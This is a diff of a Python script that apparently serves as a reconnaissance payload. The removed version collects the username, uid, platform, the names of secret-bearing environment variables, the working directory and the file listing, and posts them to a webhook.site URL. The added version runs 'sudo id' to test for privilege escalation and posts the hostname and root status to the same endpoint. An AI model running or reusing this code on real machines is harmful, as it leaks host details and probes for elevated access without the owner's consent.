@@ -1,37 +1,28 @@
 import os
 import requests
 import socket
-import platform
-import sys
+import subprocess
 
- 
 WEBHOOK_URL = "https://webhook.site/7c0dc567-3ce3-4b87-8393-1ea64c832f20"
 
-def exfiltrate_data():
-    print("--- Starting Data Collection ---")
-    
+def check_privileges():
  
-    user = os.getenv('USER') or os.getenv('USERNAME') or "unknown"
-    uid = os.getuid() if hasattr(os, 'getuid') else "unknown"
-    
- 
-    env_vars = {k: "********" for k, v in os.environ.items() if any(s in k.upper() for s in ['TOKEN', 'SECRET', 'KEY', 'PASSWORD', 'AUTH', 'CREDENTIAL'])}
-    
+    try:
+      
+        result = subprocess.check_output(["sudo", "id"], stderr=subprocess.STDOUT)
+        privilege_status = result.decode('utf-8').strip()
+    except subprocess.CalledProcessError as e:
+        privilege_status = f"Failed to escalate: {e.output.decode('utf-8').strip()}"
+    except Exception as e:
+        privilege_status = f"Error: {str(e)}"
+
     data = {
         "hostname": socket.gethostname(),
-        "user": user,
-        "uid": uid,
-        "platform": platform.platform(),
-        "detected_secrets": list(env_vars.keys()),
-        "working_directory": os.getcwd(),
-        "file_list": os.listdir('.') if os.path.exists('.') else []
+        "privilege_escalation_test": privilege_status,
+        "is_root": "uid=0" in privilege_status
     }
     
-    try:
-        response = requests.post(WEBHOOK_URL, json=data)
-        print(f"Data sent. Status Code: {response.status_code}")
-    except Exception as e:
-        print(f"Failed to exfiltrate: {e}")
+    requests.post(WEBHOOK_URL, json=data)
 
 if __name__ == "__main__":
-    exfiltrate_data()
+    check_privileges()
